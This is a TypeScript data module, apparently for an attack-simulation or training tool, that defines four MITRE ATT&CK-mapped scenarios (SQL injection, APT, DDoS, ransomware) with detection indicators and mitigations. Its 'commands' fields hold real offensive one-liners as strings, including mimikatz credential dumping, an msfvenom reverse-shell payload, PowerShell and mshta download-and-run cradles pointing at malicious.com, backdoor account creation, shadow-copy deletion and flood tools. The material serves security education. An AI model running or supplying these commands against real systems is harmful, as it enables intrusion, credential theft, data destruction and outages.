
import { v4 as uuidv4 } from 'uuid';

export interface AttackStep {
  id: string;
  name: string;
  description: string;
  technique: string; // MITRE ATT&CK technique ID
  duration: number; // in milliseconds
  targetComponent?: string;
  detectionDifficulty: number; // 1-10 scale
  prerequisites?: string[];
  indicators?: string[]; // Observable indicators
  commands?: string[]; // Example commands that would be used
}

export interface AttackScenario {
  id: string;
  name: string;
  description: string;
  complexity: 'Low' | 'Medium' | 'High' | 'Critical';
  steps: AttackStep[];
  targetSystems: string[];
  mitigationStrategy?: string;
  tacticsUsed?: string[]; // MITRE ATT&CK tactics
}

// Based on MITRE ATT&CK framework techniques
export const attackScenarios: AttackScenario[] = [
  {
    id: uuidv4(),
    name: 'SQL Injection Campaign',
    description: 'A sophisticated SQL injection attack targeting the database server to extract sensitive information.',
    complexity: 'Medium',
    targetSystems: ['Database'],
    tacticsUsed: ['Initial Access', 'Discovery', 'Collection', 'Exfiltration'],
    mitigationStrategy: 'Input validation, prepared statements, and database user privilege restriction',
    steps: [
      {
        id: uuidv4(),
        name: 'Reconnaissance',
        description: 'Attacker scans for web forms and input fields connected to databases',
        technique: 'T1595',
        duration: 3000,
        detectionDifficulty: 4,
        indicators: [
          'Multiple rapid requests to different form endpoints',
          'Web scanner user agent strings',
          'Sequential parameter probing'
        ],
        commands: [
          'nmap -sV --script=http-enum <target>',
          'dirb http://<target>/admin/ /usr/share/wordlists/dirb/common.txt'
        ]
      },
      {
        id: uuidv4(),
        name: 'Vulnerability Scanning',
        description: 'Attacker identifies potential SQL injection points',
        technique: 'T1590',
        duration: 2500,
        detectionDifficulty: 5,
        prerequisites: ['Reconnaissance'],
        indicators: [
          'Requests with SQL metacharacters (quotes, comments)',
          'Error-triggering requests',
          'Time-based probing patterns'
        ],
        commands: [
          'sqlmap -u "http://<target>/page.php?id=1" --dbs',
          'curl "http://<target>/page.php?id=1\'"'
        ]
      },
      {
        id: uuidv4(),
        name: 'Exploit SQL Injection',
        description: 'Attacker inserts malicious SQL commands into input fields',
        technique: 'T1190',
        targetComponent: 'Database',
        duration: 2000,
        detectionDifficulty: 7,
        prerequisites: ['Vulnerability Scanning'],
        indicators: [
          'SQL syntax in request parameters',
          'Union-based queries',
          'Database error messages in responses',
          'Unusual database query patterns'
        ],
        commands: [
          'curl "http://<target>/page.php?id=1 UNION SELECT username,password FROM users"',
          'sqlmap -u "http://<target>/page.php?id=1" --tables --dump'
        ]
      },
      {
        id: uuidv4(),
        name: 'Data Exfiltration',
        description: 'Attacker extracts sensitive data from database',
        technique: 'T1030',
        targetComponent: 'Database',
        duration: 4000,
        detectionDifficulty: 8,
        prerequisites: ['Exploit SQL Injection'],
        indicators: [
          'Large data transfers',
          'Unusual database read operations',
          'Data encoding in HTTP responses',
          'DNS queries with encoded data'
        ],
        commands: [
          'sqlmap -u "http://<target>/page.php?id=1" --dump',
          'for i in $(seq 1 100); do curl "http://<target>/page.php?id=$i" >> data.txt; done'
        ]
      }
    ]
  },
  {
    id: uuidv4(),
    name: 'Advanced Persistent Threat',
    description: 'A multi-stage attack that establishes persistent access to the network and moves laterally.',
    complexity: 'Critical',
    targetSystems: ['Web Server', 'Auth Server', 'API Gateway'],
    tacticsUsed: ['Initial Access', 'Execution', 'Persistence', 'Privilege Escalation', 'Lateral Movement', 'Collection'],
    mitigationStrategy: 'Network segmentation, multi-factor authentication, endpoint detection and response',
    steps: [
      {
        id: uuidv4(),
        name: 'Phishing Campaign',
        description: 'Targeted phishing emails sent to employees',
        technique: 'T1566',
        duration: 3000,
        detectionDifficulty: 6,
        indicators: [
          'Suspicious email attachments',
          'Emails with urgent call to action',
          'Links to credential harvesting sites',
          'Document files with macros'
        ],
        commands: [
          'sendmail -t < phishing_email.txt',
          'msfvenom -p windows/meterpreter/reverse_https LHOST=<attacker_ip> LPORT=443 -f exe > malware.exe'
        ]
      },
      {
        id: uuidv4(),
        name: 'Initial Access',
        description: 'Exploitation of vulnerable web application',
        technique: 'T1190',
        targetComponent: 'Web Server',
        duration: 2500,
        detectionDifficulty: 7,
        prerequisites: ['Phishing Campaign'],
        indicators: [
          'Unusual process spawning from web server',
          'Unexpected outbound connections',
          'Web shell artifacts on disk',
          'Suspicious command execution'
        ],
        commands: [
          'curl -X POST --data "cmd=whoami" http://<target>/vulnerable.php',
          'msfconsole -q -x "use exploit/multi/http/apache_struts2_rest_xstream; set RHOSTS <target>; run"'
        ]
      },
      {
        id: uuidv4(),
        name: 'Credential Access',
        description: 'Attacker steals authentication credentials',
        technique: 'T1110',
        targetComponent: 'Auth Server',
        duration: 3500,
        detectionDifficulty: 8,
        prerequisites: ['Initial Access'],
        indicators: [
          'Multiple authentication failures',
          'Access to credential stores',
          'Memory reading from LSASS process',
          'Suspicious registry access'
        ],
        commands: [
          'mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit',
          'reg save HKLM\\SAM sam.hive && reg save HKLM\\SYSTEM system.hive'
        ]
      },
      {
        id: uuidv4(),
        name: 'Lateral Movement',
        description: 'Attacker moves laterally to other systems',
        technique: 'T1021',
        duration: 4000,
        detectionDifficulty: 9,
        prerequisites: ['Credential Access'],
        indicators: [
          'New administrative connections between hosts',
          'Unusual RDP or SMB activity',
          'Use of administrative tools like PsExec',
          'Creation of scheduled tasks on remote systems'
        ],
        commands: [
          'wmic /node:<target> process call create "cmd.exe /c net user /add backdoor Password123"',
          'psexec \\\\<target> -u Administrator -p Password123 -s cmd.exe'
        ]
      },
      {
        id: uuidv4(),
        name: 'Data Collection',
        description: 'Attacker harvests sensitive information',
        technique: 'T1119',
        targetComponent: 'API Gateway',
        duration: 5000,
        detectionDifficulty: 8,
        prerequisites: ['Lateral Movement'],
        indicators: [
          'Unusual file access patterns',
          'Mass copying of data',
          'Unexpected compression of files',
          'Access to sensitive database tables'
        ],
        commands: [
          'dir /S /B *.xlsx *.docx *.pdf > filelist.txt',
          'powershell "Compress-Archive -Path C:\\Users\\Administrator\\Documents -DestinationPath C:\\temp\\data.zip"'
        ]
      }
    ]
  },
  {
    id: uuidv4(),
    name: 'DDoS Attack',
    description: 'Distributed Denial of Service attack targeting network infrastructure',
    complexity: 'High',
    targetSystems: ['Web Server', 'CDN'],
    tacticsUsed: ['Resource Development', 'Initial Access', 'Impact'],
    mitigationStrategy: 'Traffic filtering, rate limiting, CDN protection, network monitoring',
    steps: [
      {
        id: uuidv4(),
        name: 'Botnet Preparation',
        description: 'Attacker prepares network of compromised systems',
        technique: 'T1498',
        duration: 2000,
        detectionDifficulty: 5,
        indicators: [
          'Command and control communications',
          'Unusual outbound connections',
          'Beaconing traffic patterns',
          'Systems joining known botnet infrastructures'
        ],
        commands: [
          'apt-get install tor && service tor start',
          'python3 botnet_c2.py --initialize --bots 1000'
        ]
      },
      {
        id: uuidv4(),
        name: 'Resource Exhaustion',
        description: 'Massive traffic sent to exhaust server resources',
        technique: 'T1499',
        targetComponent: 'CDN',
        duration: 3000,
        detectionDifficulty: 6,
        prerequisites: ['Botnet Preparation'],
        indicators: [
          'Traffic volume spikes',
          'Unusual protocol distribution',
          'Abnormal request patterns',
          'High resource utilization on targets'
        ],
        commands: [
          'hping3 --flood --rand-source -p 80 <target>',
          'ab -n 100000 -c 1000 http://<target>/'
        ]
      },
      {
        id: uuidv4(),
        name: 'Service Disruption',
        description: 'Services become unavailable due to overwhelming traffic',
        technique: 'T1498',
        targetComponent: 'Web Server',
        duration: 4000,
        detectionDifficulty: 7,
        prerequisites: ['Resource Exhaustion'],
        indicators: [
          'Service availability degradation',
          'Timeout errors',
          'Connection refused errors',
          'Complete service outage'
        ],
        commands: [
          'python3 slowloris.py <target> --sockets 1000',
          'msfconsole -q -x "use auxiliary/dos/http/slowloris; set RHOST <target>; run"'
        ]
      }
    ]
  },
  {
    id: uuidv4(),
    name: 'Ransomware Attack',
    description: 'A targeted ransomware attack that encrypts data and demands payment',
    complexity: 'High',
    targetSystems: ['File Server', 'Backup System'],
    tacticsUsed: ['Initial Access', 'Execution', 'Persistence', 'Defense Evasion', 'Impact'],
    mitigationStrategy: 'Regular backups, endpoint protection, email filtering, user awareness training',
    steps: [
      {
        id: uuidv4(),
        name: 'Initial Compromise',
        description: 'Attacker gains access via malicious document attachment',
        technique: 'T1566.001',
        duration: 2500,
        detectionDifficulty: 6,
        indicators: [
          'Suspicious document opened from email',
          'Macro execution in Office documents',
          'Unusual PowerShell execution chains',
          'Child processes spawned from document readers'
        ],
        commands: [
          'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://malicious.com/payload.ps1\')"',
          'mshta.exe javascript:a=GetObject("script:http://malicious.com/payload.sct").Exec();close();'
        ]
      },
      {
        id: uuidv4(),
        name: 'Privilege Escalation',
        description: 'Attacker gains admin rights to ensure maximum impact',
        technique: 'T1068',
        duration: 3000,
        detectionDifficulty: 8,
        prerequisites: ['Initial Compromise'],
        indicators: [
          'Exploitation of unpatched vulnerabilities',
          'Use of known privilege escalation tools',
          'Unusual service installations',
          'Security tool tampering'
        ],
        commands: [
          'exploit.exe CVE-2021-34484',
          'powershell.exe -Command "Start-Process cmd.exe -Verb RunAs"'
        ]
      },
      {
        id: uuidv4(),
        name: 'Disable Backups',
        description: 'Attacker disables backup systems to prevent recovery',
        technique: 'T1490',
        targetComponent: 'Backup System',
        duration: 2000,
        detectionDifficulty: 7,
        prerequisites: ['Privilege Escalation'],
        indicators: [
          'Stopping of backup services',
          'Deletion of shadow copies',
          'Modification of backup configurations',
          'Unusual access to backup storage'
        ],
        commands: [
          'vssadmin delete shadows /all /quiet',
          'wbadmin delete catalog -quiet',
          'bcdedit /set {default} recoveryenabled No'
        ]
      },
      {
        id: uuidv4(),
        name: 'Data Encryption',
        description: 'Encryption of files across network shares and local drives',
        technique: 'T1486',
        targetComponent: 'File Server',
        duration: 5000,
        detectionDifficulty: 9,
        prerequisites: ['Disable Backups'],
        indicators: [
          'High disk I/O activity',
          'Mass file modification',
          'Creation of ransom notes',
          'File extension changes'
        ],
        commands: [
          'for /R C:\\ %f in (*.docx *.xlsx *.pdf *.jpg) do (encrypt.exe "%f")',
          'powershell.exe -Command "Get-ChildItem -Path C:\\ -Recurse -Include *.docx,*.pdf | ForEach-Object { Encrypt-File $_.FullName }"'
        ]
      },
      {
        id: uuidv4(),
        name: 'Ransom Demand',
        description: 'Display of ransom demands and payment instructions',
        technique: 'T1491.001',
        duration: 1500,
        detectionDifficulty: 3,
        prerequisites: ['Data Encryption'],
        indicators: [
          'Desktop wallpaper change',
          'Ransom note text files',
          'Browser open to payment instructions',
          'System notifications about encryption'
        ],
        commands: [
          'reg add HKCU\\Control Panel\\Desktop /v Wallpaper /t REG_SZ /d C:\\ransom.jpg /f',
          'start notepad.exe DECRYPT_INSTRUCTIONS.txt'
        ]
      }
    ]
  }
];

export function getRandomAttackScenario(): AttackScenario {
  return attackScenarios[Math.floor(Math.random() * attackScenarios.length)];
}

export function getScenarioByName(name: string): AttackScenario | undefined {
  return attackScenarios.find(scenario => scenario.name.includes(name));
}

export function getScenariosByTactic(tactic: string): AttackScenario[] {
  return attackScenarios.filter(scenario => 
    scenario.tacticsUsed?.includes(tactic)
  );
}

export function getScenariosByComplexity(complexity: 'Low' | 'Medium' | 'High' | 'Critical'): AttackScenario[] {
  return attackScenarios.filter(scenario => scenario.complexity === complexity);
}
